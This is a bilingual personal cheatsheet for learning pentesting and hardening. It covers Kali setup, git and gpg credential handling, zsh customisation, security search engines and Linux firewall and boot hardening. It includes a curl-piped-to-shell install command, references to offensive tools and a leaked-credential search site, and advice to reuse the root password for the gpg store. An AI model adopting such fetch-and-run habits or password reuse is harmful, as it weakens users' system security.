<img src="https://cdn.pixabay.com/photo/2013/07/13/11/43/tux-158547_960_720.png"/>

# Descargo de responsabilidad

La finalidad de este fichero es recopilar información actualizada mientras aprendo pentesting, hardening y
seguridad informática en definitiva. Por favor, no uses este conocimiento para cometer actos ilegales, por lo que
yo no me hago responsable de las acciones ilegales que puedas cometer.

Usa estos comandos en un laboratorio controlado, por ejemplo, ejecutando distintas máquinas virtuales en vmware o virtualbox,
o en las máquinas que provee hackthebox. Están diseñadas para ser divertidas de hackear mientras aprendes.
Un gran poder conlleva una gran responsabilidad, procura ser un agente del bien.

Actualmente el fichero está disgregado, verás distintos ejemplos de la misma herramienta por aquí y por allá.
Está hecho así a proposito, algún día, cuando tenga mucho material actualizado acumulado, dentro de unos años, lo dejaré bien ordenado.
También me gustaría que este trabajo llegue algún a las manos de Israel, la persona de quien forkeé el original.
Estoy aprendiendo de él y de otros más como Santiago Hernandez y S4vitar.
En estos momentos voy agregando lo último que voy viendo al principio del fichero.

Mis disculpas por poner cosas en inglés y en Español, hay veces que me da por escribir en uno u otro, dependiendo del humor y de la dificultad
de cada cosa.

Este fichero está dedicado a mis sobrinos Marcos y Blanca, a los dos por igual, con la esperanza que algún día lo encuentren y les sea útil.
Os quiero mucho.

Dejaré tambien en mi repositorio gist algunos scripts que podrán usar si le encuentran utilidad, claro.
En algún momento, les legaré las contraseñas o la manera de poder tener control total sobre mis repositorios de código.

    https://gist.github.com/alonsoir

# Disclaimer

The purpose of this file is to collect updated information while I learn pentesting,hardening cloud systems and
cybersecurity.

Please do not use this knowledge to commit illegal acts, so i am not responsible for any illegal
actions you may commit.

Use these commands in a controlled lab, for example running different virtual machines on vmware or virtualbox,
or on machines provided by hackthebox. They are designed to be fun to hack while you learn.

# Prerequisites:

    Marcos, Blanca, cuando veáis algo así:

    ❯

    significa que voy a escribir comandos en la terminal. Habrá veces donde no he puesto ese símbolo, puede que se me haya pasado.
    Por ejemplo, aquí estoy ejecutando el comando ls que sirve para listar ficheros:

        ❯ ls
         AWS_Secure_Account_Setup.pdf   CheatsheetHacking.md  'ciberseguridad avanzado.pdf'   despliegue_nube.ctd   output-cncintel.htlml   README.md   report-cnc   report-cnc.html   skipfish-cnc.html

              ~/CheatSheetsHacking  on    master !1 

    También puede ser que veáis algo así:

            ┌──(root㉿kali)-[/home/kali]
            └─# passwd

    Es otra manera chula de mostrar la línea de comandos, como usar >

    Si os preguntáis por qué, en el momento de escribir esto tuve que reinstalar el sistema al menos un par de veces, y al configurar p10k, algunas veces iba por una u otra manera.
    I recommend to install git in order to clone this repo.

    Install git in windows machines:

        https://phoenixnap.com/kb/how-to-install-git-windows

    Install git in osx machines:

        https://git-scm.com/book/en/v2/Getting-Started-Installing-Git

    Once you have git installed, clone this repo, using a terminal run the next command:

        ❯ mkdir git
        ❯ cd git
        ❯ git clone https://github.com/alonsoir/CheatSheetsHacking.git

    To get latest updates, run the next command in git folder:

        ❯ git pull

    To push new content, first you need to create a personal account in github

        Go to https://github.com/

        click on Sign Up

        provide credentials to github.

        Take notes!

    then, you need to install git-credential-manager and maybe install pass.

        https://github.com/GitCredentialManager/git-credential-manager/blob/main/README.md

        https://www.passwordstore.org/

    Download .deb package, in my case at the time of writing this text,

        ❯ wget https://github.com/GitCredentialManager/git-credential-manager/releases/download/v2.0.785/gcm-linux_amd64.2.0.785.deb

    then,

        ❯ dpkg -i gcm-linux_amd64.2.0.785.deb

        ❯ git-credential-manager-core configure gpg

    Es posible que no tengas generadas el par de claves público/privadas gpg, y que tampoco tengas instalada la utilidad pass,
    por lo que, vamos a ello.

    Para generar el par de claves:

        ❯ gpg --gen-key
        gpg (GnuPG) 2.2.39; Copyright (C) 2022 g10 Code GmbH
        This is free software: you are free to change and redistribute it.
        There is NO WARRANTY, to the extent permitted by law.

        gpg: caja de claves '/home/kali/.gnupg/pubring.kbx' creada
        Nota: Usa "gpg --full-generate-key" para el diálogo completo de generación de clave.

        GnuPG debe construir un ID de usuario para identificar su clave.

        Nombre y apellidos: Alonso Isidoro Román
        Dirección de correo electrónico: alonsoir@gmail.com
        ...

    Recien generadas, puedes listarlas. No os preocupeis por el mogollón de información.
    Lo más importante es que al proporcionar el email, este funciona como el parametro para usar el comando pass.

    También, muy importante, cuando las generen, os pedirán una contraseña para gestionar dicho almacen de contraseñas gpg.
    Proporcionad una, es una muy importante, por lo que tenéis que recordadla. Si queréis, proporcionad la misma que tenéis
    para el usuario root para que no se os olvide. (*)

        ❯ gpg --list-keys
        ...

    Vamos a inicializar el almacen de claves con la utilidad pass:

        ❯ pass init alonsoir@gmail.com
        zsh: command not found: pass

    ups, no está instalada!

        ❯ sudo apt install pass
        ...

    Ahora si la tengo instalada, uso como parámetro, el correo electrónico que hayáis usado.

        ❯ pass init alonsoir@gmail.com
        mkdir: se ha creado el directorio '/home/kali/.password-store/'
        Password store initialized for alonsoir@gmail.com
        ❯ git push
        info: please complete authentication in your browser...
        Enumerando objetos: 5, listo.
        Contando objetos: 100% (5/5), listo.
        Compresión delta usando hasta 4 hilos
        Comprimiendo objetos: 100% (3/3), listo.
        Escribiendo objetos: 100% (3/3), 2.56 KiB | 654.00 KiB/s, listo.
        Total 3 (delta 2), reusados 0 (delta 0), pack-reusados 0
        remote: Resolving deltas: 100% (2/2), completed with 2 local objects.
        To https://github.com/alonsoir/CheatSheetsHacking.git
           b4ba622..eab859c  master -> master

    Ahora, finalmente por fin puedo inicializar git para que use gpg y éste gestione el usuario/contraseña.

    Lo sé, sobrinos, es un coñazo, pero son buenas prácticas de seguridad y en los tiempos que vais a vivir,
    vuestra información privada es super importante.

    Tenéis que aprender a protegeros.

        ❯ git config --global credential.credentialStore gpg

        finally, you can do

        ❯ git add FILES
        ❯ git commit -m "some commit message"
        ❯ git push

        A browser like firefox will launch y acabarán viendo algo como después de proporcionar la contraseña que usaron para crear el almacen de claves gpg. (*)

                                Authentication Succeeded

                                You may now close this tab and return to the application.


# First steps, primeros pasos

    Install vmware or virtualbox in your host system and then install kali.
    You have to dowload a ISO image of Kali linux. Follow instructions.
    4 GB RAM recommended. The more resources you can assign, the best.
    There are tools like Maltego that need a lot of resources to go fairly smooth. The more you can, the better.

    https://thesecmaster.com/install-kali-linux-on-vmware-workstation/

    https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/

    Then, i recommend to harden the system and install git in Kali.
    https://www.kali.org/tools/git/

    Optional

    Install this script:

        ❯ git clone https://github.com/blacklanternsecurity/kali-setup-script

        ❯ cd kali-setup-script

        ❯ chmod +x

        ❯ sudo ./kali-setup-script.sh

    # Full feature list:

    Enables details logging of terminal sessions

        Including ALL OUTPUT (saved to ~/Logs)

    The above script installs the following:

        CrackMapExec (from GitHub)
        Impacket (from GitHub)
        Bloodhound (from GitHub)
        EAPhammer (from GitHub)
        patator (network brute-force tool)
        PCredz
        Gowitness
        EavesARP
        bettercap
        docker
        Firefox (official non-ESR version)
        Chromium
        Sublime Text
        BoostNote
        golang (plus environment)
        zmap
        LibreOffice
        htop
        Remmina
        gnome-screenshot
        realtek-rtl88xxau-dkms (ALFA wireless drivers)
        i3 + XFCE desktop environment (optional)

    and...

    Updates system
    Removes gnome-software
    Disables auto-lock
    Enables tap-to-click
    Initializes Metasploit database
    Installs rad BLS wallpaper

    Opcional (redimensionar el disco duro)

    Personalmente, como me gusta trabajar con máquinas virtuales sobre un sistema anfitrion, en mi caso el anfitrion es osx y uso vmware para virtualizar sistemas,
    encuentro que siempre se me olvida añadir un tamaño adecuado para el sistema Kali, por lo que voy a proveer instruccciones para cambiar.
    Voy a usar gparted, es una herramienta con mil años de antiguedad pero hace su trabajo. Para instalarla, abre una terminal y ejecuta el siguiente comando:

        ❯ sudo apt install gparted

    https://aprendiendoavirtualizar.com/aumentar-particion-de-sistema-con-gparted/

    En definitiva, quieres acabar así, una particion raiz de 200 GB y una particion swap de 1GB:

        ❯ df -Hh
        S.ficheros     Tamaño Usados  Disp Uso% Montado en
        udev             3,8G      0  3,8G   0% /dev
        tmpfs            783M   1,3M  782M   1% /run
        /dev/sda1        196G    20G  168G  11% /
        tmpfs            3,9G      0  3,9G   0% /dev/shm
        tmpfs            5,0M      0  5,0M   0% /run/lock
        tmpfs            783M    72K  783M   1% /run/user/130
        tmpfs            783M    84K  783M   1% /run/user/1000

        ❯ sudo fdisk /dev/sda
        [sudo] contraseña para kali:

        Welcome to fdisk (util-linux 2.38.1).
        Changes will remain in memory only, until you decide to write them.
        Be careful before using the write command.

        This disk is currently in use - repartitioning is probably a bad idea.
        It's recommended to umount all file systems, and swapoff all swap
        partitions on this disk.


        Command (m for help): p

        Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors
        Disk model: VMware Virtual S
        Units: sectors of 1 * 512 = 512 bytes
        Sector size (logical/physical): 512 bytes / 512 bytes
        I/O size (minimum/optimal): 512 bytes / 512 bytes
        Disklabel type: dos
        Disk identifier: 0xcf6159e3

        Device     Boot     Start       End   Sectors  Size Id Type
        /dev/sda1  *         2048 417398783 417396736  199G 83 Linux
        /dev/sda3       417400832 419430399   2029568  991M 82 Linux swap / Solaris

        Command (m for help):

    Y partes de una particion raiz de 80 GB, una particion swap de 1 GB y tienes 120 GB de espacio sin asignar.
    Para rizar el rizo, la swap está colocada entre la partición raiz y la del espacio sin asignar.

    En el documento html aprendiendoavirtualizar se describe esta situación, sigue las instrucciones, pero, básicamente tienes que hacer lo siguiente:

        IMPORTANTE!!!

        Guardad todos los ficheros importantes en otro lugar diferente a este disco duro.
        Sobrinos, vamos a hacer tareas muy delicadas, podemos perder datos importantes, por lo que guardarlos en otro lugar.

    1) desactivar la particion swap
    2) redimensionar la antigua particion swap con el espacio desasignado.
    3) asignar a la particion raiz el espacio desasignado. No asignes todo, deja 1 GB
    4) Crea una particion raiz de tipo swap con ese GB
    5) Aplicad los cambios.
    6) ejecuta en la terminal el comando siguiente:

        ❯ sudo blkid
        /dev/sda3: UUID="d5508cbb-b4df-4ce9-ae3f-f46d4dcccdc9" TYPE="swap" PARTUUID="cf6159e3-03"
        /dev/sda1: UUID="c846c5cd-8447-4d17-a782-8e5bf4be60ae" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="cf6159e3-01"

        copia el UUID de la particion tipo swapp, en mi caso d5508cbb-b4df-4ce9-ae3f-f46d4dcccdc9

    7) edita el fichero /etc/fstab con permisos de administrador:

        ❯ sudo gedit /etc/fstab

            # /etc/fstab: static file system information.
            #
            # Use 'blkid' to print the universally unique identifier for a
            # device; this may be used with UUID= as a more robust way to name devices
            # that works even if disks are added and removed. See fstab(5).
            #
            # systemd generates mount units based on this file, see systemd.mount(5).
            # Please run 'systemctl daemon-reload' after making changes here.
            #
            # <file system> <mount point>   <type>  <options>       <dump>  <pass>
            # / was on /dev/sda1 during installation
            UUID=c846c5cd-8447-4d17-a782-8e5bf4be60ae /               ext4    errors=remount-ro 0       1
            # swap was on /dev/sda5 during installation
            UUID=d5508cbb-b4df-4ce9-ae3f-f46d4dcccdc9 none            swap    sw              0       0
            # /dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

            Ya puestos, desactiva el cdrom, probablemente ni lo tengas instalado en la máquina que estés usando.
            Veis como he puesto el UUID de la particion SWAP?

    8) reiniciad el sistema, y si todo ha ido bien, el sistema arrancará como un tiro y tendrás una particion raiz del tamaño deseado.

# A vast collection of security tools for bug bounty, pentest and red teaming

    https://offsec.tools
    
# Personalización de zsh en Kali Linux

    Lo primero de todo comprobamos la shell en la que se esta trabajando.

    Recuerda que $$ se corresponde con el pid del proceso actual.

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ ls -l /proc/$$/exe
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Más información sobre la shell zsh: https://en.wikipedia.org/wiki/Z_shell

    Para facilitar la gestión de la configuración de zsh, instalamos ohmyzsh: https://github.com/ohmyzsh/ohmyzsh/wiki

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    El mensaje que aparece de Python es simplemente informativo cuando haces login con Kali Linux

    Instalamos el tema powerlevel10k: https://github.com/romkatv/powerlevel10k

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Modificamos el fichero de configuracion ~/.zshrc y añadimos la siguiente sentencia:

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ZSH_THEME="powerlevel10k/powerlevel10k"
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Para cambiar la configuración del prompt reiniciamos la terminal o ejecutamos el siguiente comando:

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ p10k configure
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Modificamos el fichero de configuracion ~/.p10k.zsh y seleccionamos las características que nos interesen.

    Instalamos un modulo para sugerencias automaticas:

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Instalamos un plugin que resalta la sintaxis:

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ❯ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Modificamos el fichero de configuracion ~/.zshrc y añadimos la siguiente sentencia:

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    plugins=(
        # other plugins...
        zsh-autosuggestions
        zsh-syntax-highlighting
    )

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Modificamos el fichero ~/.p10k.zsh

    Busca POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS si quieres modificar los iconos de la derecha para que vuestra terminal sea vea asi:

          ~                                                                                                       ✔ │ 27%    364M    at 07:45:32 AM    ⇣0 B/s ⇡0 B/s 192.168.85.130   your public IP

    typeset -g POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(
    status                  # exit code of the last command
    command_execution_time  # duration of the last command
    background_jobs         # presence of background jobs
    direnv                  # direnv status (https://direnv.net/)
    asdf                    # asdf version manager (https://github.com/asdf-vm/asdf)
    virtualenv              # python virtual environment (https://docs.python.org/3/library/venv.html)
    anaconda                # conda environment (https://conda.io/)
    pyenv                   # python environment (https://github.com/pyenv/pyenv)
    goenv                   # go environment (https://github.com/syndbg/goenv)
    nodenv                  # node.js version from nodenv (https://github.com/nodenv/nodenv)
    nvm                     # node.js version from nvm (https://github.com/nvm-sh/nvm)
    nodeenv                 # node.js environment (https://github.com/ekalinin/nodeenv)
    # node_version          # node.js version
    # go_version            # go version (https://golang.org)
    # rust_version          # rustc version (https://www.rust-lang.org)
    # dotnet_version        # .NET version (https://dotnet.microsoft.com)
    # php_version           # php version (https://www.php.net/)
    # laravel_version       # laravel php framework version (https://laravel.com/)
    # java_version          # java version (https://www.java.com/)
    # package               # name@version from package.json (https://docs.npmjs.com/files/package.json)
    # rbenv                   # ruby version from rbenv (https://github.com/rbenv/rbenv)
    # rvm                     # ruby version from rvm (https://rvm.io)
    # fvm                     # flutter version management (https://github.com/leoafarias/fvm)
    # luaenv                  # lua version from luaenv (https://github.com/cehoffman/luaenv)
    # jenv                    # java version from jenv (https://github.com/jenv/jenv)
    # plenv                   # perl version from plenv (https://github.com/tokuhirom/plenv)
    # perlbrew                # perl version from perlbrew (https://github.com/gugod/App-perlbrew)
    # phpenv                  # php version from phpenv (https://github.com/phpenv/phpenv)
    # scalaenv                # scala version from scalaenv (https://github.com/scalaenv/scalaenv)
    # haskell_stack           # haskell version from stack (https://haskellstack.org/)
    # kubecontext             # current kubernetes context (https://kubernetes.io/)
    # terraform               # terraform workspace (https://www.terraform.io)
    # terraform_version     # terraform version (https://www.terraform.io)
    # aws                     # aws profile (https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html)
    # aws_eb_env              # aws elastic beanstalk environment (https://aws.amazon.com/elasticbeanstalk/)
    # azure                   # azure account name (https://docs.microsoft.com/en-us/cli/azure)
    # gcloud                  # google cloud cli account and project (https://cloud.google.com/)
    # google_app_cred         # google application credentials (https://cloud.google.com/docs/authentication/production)
    # toolbox                 # toolbox name (https://github.com/containers/toolbox)
    context                 # user@hostname
    # nordvpn                 # nordvpn connection status, linux only (https://nordvpn.com/)
    # ranger                  # ranger shell (https://github.com/ranger/ranger)
    # nnn                     # nnn shell (https://github.com/jarun/nnn)
    # xplr                    # xplr shell (https://github.com/sayanarijit/xplr)
    vim_shell               # vim shell indicator (:sh)
    # midnight_commander      # midnight commander shell (https://midnight-commander.org/)
    # nix_shell               # nix shell (https://nixos.org/nixos/nix-pills/developing-with-nix-shell.html)
    vi_mode                 # vi mode (you don't need this if you've enabled prompt_char)
    vpn_ip                # virtual private network indicator
    # load                  # CPU load
    disk_usage            # disk usage
    ram                   # free RAM
    # swap                  # used swap
    # todo                    # todo items (https://github.com/todotxt/todo.txt-cli)
    # timewarrior             # timewarrior tracking status (https://timewarrior.net/)
    # taskwarrior             # taskwarrior task count (https://taskwarrior.org/)
    time                    # current time
    ip                    # ip address and bandwidth usage for a specified network interface
    public_ip             # public IP address
    # proxy                 # system-wide http/https/ftp proxy
    # battery               # internal battery
    # wifi                  # wifi speed
    # example               # example user-defined segment (see prompt_example function below)
    )


    Por último cambiamos la configuración de la terminal y creamos los siguientes atajos de teclado:

    - Split Terminal Horizontally -> Ctrl-space
    - Split Terminal Vertically -> Ctrl-\
    - Collapse Subterminal -> Ctrl-Backspace
    - Right subterminal -> Ctrl-]
    - Left subterminal -> Ctrl-[

# 30 cybersecurity search engines for researchers:

    Estos son motores de búsqueda para encontrar información importante para investigadores como vosotros.

    1. Dehashed—View leaked credentials.
        https://www.dehashed.com
    2. SecurityTrails—Extensive DNS data.
        https://securitytrails.com
    3. DorkSearch—Really fast Google dorking.
        https://dorksearch.com
    4. ExploitDB—Archive of various exploits.
        https://www.exploit-db.com/history
    5. ZoomEye—Gather information about targets.
        https://www.zoomeye.org/project?id=firewall
    6. Pulsedive—Search for threat intelligence.
        https://pulsedive.com
    7. GrayHatWarefare—Search public S3 buckets.
        https://buckets.grayhatwarfare.com
    8. PolySwarm—Scan files and URLs for threats.
        https://polyswarm.io
    9. Fofa—Search for various threat intelligence.
        https://fofa.info
    10. LeakIX—Search publicly indexed information.
        https://leakix.net
    11. DNSDumpster—Search for DNS records quickly.
        https://dnsdumpster.com
    12. FullHunt—Search and discovery attack surfaces.
        https://fullhunt.io
    13. AlienVault—Extensive threat intelligence feed.
        https://otx.alienvault.com
    14. ONYPHE—Collects cyber-threat intelligence data.
        https://www.onyphe.io
    15. Grep App—Search across a half million git repos.
        https://grep.app
    16. URL Scan—Free service to scan and analyse websites.
        https://urlscan.io
    17. Vulners—Search vulnerabilities in a large database.
        https://vulners.com
    18. WayBackMachine—View content from deleted websites.
        https://archive.org/web/
    19. Shodan—Search for devices connected to the internet.
        https://www.shodan.io
    20. Netlas—Search and monitor internet connected assets.
        https://netlas.io
    21. CRT sh—Search for certs that have been logged by CT.
        https://crt.sh
    22. Wigle—Database of wireless networks, with statistics.
        https://www.wigle.net
    23. PublicWWW—Marketing and affiliate marketing research.
        https://publicwww.com
    24. Binary Edge—Scans the internet for threat intelligence.
        https://www.binaryedge.io
    25. GreyNoise—Search for devices connected to the internet.
        https://www.greynoise.io
    26. Hunter—Search for email addresses belonging to a website.
        https://hunter.io/?gclid=CjwKCAjw4JWZBhApEiwAtJUN0IQfvfDnwglAaoBDeH5gYewiBOqr4h6A615W3-hFgNPM6Rh18XEoUxoCul0QAvD_BwE
    27. Censys—Assessing attack surface for internet connected devices.
        https://censys.io
    28. IntelligenceX—Search Tor, I2P, data leaks, domains, and emails.
        https://intelx.io
    29. Packet Storm Security—Browse latest vulnerabilities and exploits.
        https://packetstormsecurity.com
    30. SearchCode—Search 75 billion lines of code from 40 million projects.
        https://searchcode.com

# How to encrypt and decrypt files using gpg

    Si gpg aún no está instalado en vuestro sistema, ejecutad:

    ❯ sudo apt install gpg

    importante!

        https://itsfoss.com/gpg-encrypt-files-basic/#comments

    Aquí generas el par de claves y el recipient con el par de claves público/privado.
    Muy importante si quieres usar este mecanismo.

        ❯ gpg --full-generate-key

    If you want to just encrypt a file in your computer, nobody knows your password, just you, and you can share this password, just use this command:

        > gpg -c cnc-decrypted.txt
        gpg: WARNING: server 'gpg-agent' is older than us (2.2.35 < 2.2.39)
        gpg: Note: Outdated servers may lack important security fixes.
        gpg: Note: Use the command "gpgconf --kill all" to restart them.
        > ls
        cnc-decrypted.txt  cnc-decrypted.txt.gpg

    To decrypt the file, nobody knows your password, just you. (First i delete .txt file. If i dont do it, gpg will overwrite the original file.)

        > rm cnc-decrypted.txt
        > gpg cnc-decrypted.txt.gpg
        gpg: WARNING: no command supplied.  Trying to guess what you mean ...
        gpg: AES256.CFB encrypted data
        gpg: WARNING: server 'gpg-agent' is older than us (2.2.35 < 2.2.39)
        gpg: Note: Outdated servers may lack important security fixes.
        gpg: Note: Use the command "gpgconf --kill all" to restart them.
        gpg: encrypted with 1 passphrase
        > ls
        cnc-decrypted.txt  cnc-decrypted.txt.gpg

    If you want to share files between users and you dont want to share the password,  
    each member will create his pair of secret/public keys attached to their email account using the very first command with --full-generate-key:

        Listing keys...

        > gpg --list-secret-keys
        gpg: checking the trustdb
        gpg: marginals needed: 3  completes needed: 1  trust model: pgp
        gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
        gpg: WARNING: server 'gpg-agent' is older than us (2.2.35 < 2.2.39)
        gpg: Note: Outdated servers may lack important security fixes.
        gpg: Note: Use the command "gpgconf --kill all" to restart them.
        /home/kali/.gnupg/pubring.kbx
        -----------------------------
        ...

        > gpg --list-public-keys
        /home/kali/.gnupg/pubring.kbx
        -----------------------------
        ...

        Ahora voy a cifrar usando el mecanismo publico/privado:

        > cat message.txt
        esto es un mensaje para cifrar
        > gpg --encrypt --output message.txt.gpg --recipient aironman2k@proton.me message.txt
        > ls
        message.txt  message.txt.gpg
        > cat message.txt.gpg
        ��&rfԋ
        U�#��6�U9i?9�V0��X~���F|�����؞����:�|��~�"a�˲��1�s��RP�E �$=A�sDn�U������2$�;ftg�������ԣ�Yz��iY
                                                                                                       蝏�x���jiYb1�[}>�4�
        ��0l�異���1�d=�f��h��L�- "ȷ�<��+��&����P4�
                                  ��]�{��"�6�Ce�=�rw���H��ԧ�����|�y▒�G�N�*���x�`-N.�uc���`?����e�~~;��h�F��k�f�C6K%�����/�@ߢ�f
        Scl^2t�*�x��B��B���7��Z�w0jFȤN�$�V��▒]W�g`r�VU��^�F;qG������d�Ø�� ��+��_�▒�v }��_��K6����%                                                                                                                   
        > gpg --decrypt --output file message.txt.gpg
        gpg: WARNING: server 'gpg-agent' is older than us (2.2.35 < 2.2.39)
        gpg: Note: Outdated servers may lack important security fixes.
        gpg: Note: Use the command "gpgconf --kill all" to restart them.
        gpg: encrypted with 3072-bit RSA key, ID 26721366D48BCC8F, created 2022-09-13
              "Alonso (alternative account email) <aironman2k@proton.me>"
        > ls
        cnc-decrypted.txt  file  message.txt  message.txt.gpg
        > cat file
        esto es un mensaje para cifrar

# Basic hardening linux server, debian based systems, and kali.

    Please, follow every step described in this video:

    https://www.youtube.com/watch?v=ZhMw53Ud2tY

    # STEP 1 - Enable Automatic Updates

    # Manual Updates:
    # become root user first, default root password is kali:
    # you want to change this root default password first.

    https://www.makeuseof.com/how-to-change-root-password-kali-linux/

    ❯ sudo passwd root

    # follow instructions, remember this password, then:

    ❯ sudo su
    ❯ apt update
    ❯ apt dist-upgrade

    # Automatic Updates:

    ❯ apt install unattended-upgrades
    ❯ dpkg-reconfigure --priority=low unattended-upgrades


    # STEP 2 - Create a Limited User Account

    # Create a User, change {username} for one you like it, like blanca. This is a user with much privileges.

    ❯ adduser {username}

    # Add user to the sudo group:

    ❯ usermod -aG sudo {username}


    # STEP 3 - Passwords are for SUCKERS! optional, you want to do this if you have another machine

    Create the Public Key Directory on your Linux Server

    ❯ mkdir ~/.ssh && chmod 700 ~/.ssh

    # Create Public/Private keys on your computer. optional

    ❯ ssh-keygen -b 4096

    # Upload your Public key to the your Linux Server (Windows). optional

    ❯ scp $env:USERPROFILE/.ssh/id_rsa.pub {username}@{server ip}:~/.ssh/authorized_keys

    # Upload your Public key to the your Linux Server (MAC). optional

    ❯ scp ~/.ssh/id_rsa.pub {username}@{server ip}:~/.ssh/authorized_keys

    # Upload your Public key to the your Linux Server (LINUX). optional

    ❯ ssh-copy-id {username}@{server ip}

    # STEP 4 - Lockdown Logins

    Edit the SSH config file, follow the steps in the video editing this file, then save it

    ❯ sudo gedit /etc/ssh/sshd_config

    ❯ sudo systemctl restart ssh.service

    # STEP 5 - FIREWALL IT UP. Very important.

    # See open ports, unless you want in your machine services like apache web server or ssh, you dont want to have open ports.

    ❯ sudo ss -tupln

    # Install UFW (universal firewall)

    https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-22-04

    ❯ sudo apt install ufw

    # See UFW status

    ❯ sudo ufw status

    # Allow port through firewall

    ❯ sudo ufw allow {port number}

    # Deny ports

    ❯ sudo ufw deny {port number}

    # example, port 80 and 443is usually dedicated to apache web server,22 is dedicated to ssh:

    ❯ sudo ufw deny 80
    ❯ sudo ufw deny 22
    ❯ sudo ufw deny 443

    # Enable Firewall at startup system

    ❯ sudo ufw enable

    # Reload Firewall

    ❯ sudo ufw reload

    # After these commands you are almost there, finally, you dont want to respond to external ping commands, so:
    # Drop pings!!

    # Edit the UFW config file

    ❯ sudo gedit /etc/ufw/before.rules

    # Add this line of config:

        -A ufw-before-input -p icmp --icmp-type echo-request -j DROP

    ❯ sudo ufw reload

    Existe una aplicación gráfica, gufw, pero en el momento de escribir ésto, no funcionaba bien la instalación en Kali Linux, pero si en Debian/Ubuntu.
    Actualización 23 Septiembre 2022:

    # Para ejecutar directamente en la consola como configuración inicial asumiendo que esta máquina no va a actuar como servidor de ningun tipo, solo va a navegar por internet:
    ufw status
    ufw default deny incoming
    ufw default deny outgoing
    ufw default deny routed
    ufw allow in on lo
    ufw deny in from 127.0.0.1/8
    ufw allow out to any port 80
    ufw allow out to any port 443
    ufw allow out to any port 53
    ufw enable
    ufw status

# More hardening advices from INCIBE

    https://www.youtube.com/watch?v=YZnkAWdXB4s

    Precaución! cuidaito, yo he ejecutado todos estos en mi kali corriendo en vmware, y no fue bien. No se porqué, pero el pass de mi usuario kali se cambió y
    tuve que reiniciar toda la instalación. Yo haría todo esto si estoy aprendiendo a securizar servidores muy importantes.
    Primero hay que practicar en un entorno seguro.
    Está claro que estos consejos son para configurar servidores que vayan a correr en la nube, 24x7x365.

# Crear una contraseña de arranque del sistema,

        > sudo grub-mkpasswd-pbkdf2
        Enter password:
        Reenter password:
        PBKDF2 hash of your password is grub.pbkdf2.sha512.10000.A473A05D5AD4E246775773AA43DF9FBA52CF9C75352FE60504D1EF5A3F3B269AF5B2B69D943B5F62528186DEF30B696881A958D5881E0103EBCA191476351580.B4483B3C0CA3FD0C88090242C31701CB46EB49828660230D2A537B8B1F90BC3C87A015800AD9FF084A79D0B4D5A617ED7968BA7E27F7B2124EBBCCBAEA110FAA
        > cd /etc/grub.d
        > ls
        00_header  05_debian_theme  10_linux  20_linux_xen  30_os-prober  30_uefi-firmware  40_custom  41_custom  README
        > sudo leafpad init-pwd
        // Add next content to the file, obviously your hash password must be the one you generated with grub-mkpasswd-pbkdf2 command...

        cat << EOF
        set superuser="root"
        password_pbkdf2 root grub.pbkdf2.sha512.10000.A473A05D5AD4E246775773AA43DF9FBA52CF9C75352FE60504D1EF5A3F3B269AF5B2B69D943B5F62528186DEF30B696881A958D5881E0103EBCA191476351580.B4483B3C0CA3FD0C88090242C31701CB46EB49828660230D2A537B8B1F90BC3C87A015800AD9FF084A79D0B4D5A617ED7968BA7E27F7B2124EBBCCBAEA110FAA%

        > chmod +x init-pwd
        chmod: changing permissions of 'init-pwd': Operation not permitted
        > sudo chmod +x init-pwd
        > sudo update-grub
        Generating grub configuration file ...
        Found theme: /boot/grub/themes/kali/theme.txt
        Found background image: /usr/share/images/desktop-base/desktop-grub.png
        Found linux image: /boot/vmlinuz-5.18.0-kali5-amd64
        Found initrd image: /boot/initrd.img-5.18.0-kali5-amd64
        Found linux image: /boot/vmlinuz-5.18.0-kali2-amd64
        Found initrd image: /boot/initrd.img-5.18.0-kali2-amd64
        Warning: os-prober will not be executed to detect other bootable partitions.
        Systems on them will not be added to the GRUB boot configuration.
        Check GRUB_DISABLE_OS_PROBER documentation entry.
        done

        Reboot the system!

# Activar modo single user

            Asignar una contraseña al usuario root y que este usuario sea el único que pueda leer el fichero de arranque.

            ┌──(root㉿kali)-[/home/kali]
            └─# passwd
            New password:
            Retype new password:
            passwd: password updated successfully   

            ┌──(root㉿kali)-[/home/kali]
            └─# chmod 400 /boot/grub/grub.cfg

# Configuracion de usuarios y grupos

# Instalar libpam-pwquality

            > apt install libpam-pwquality
            > vi /etc/security/pwquality.conf

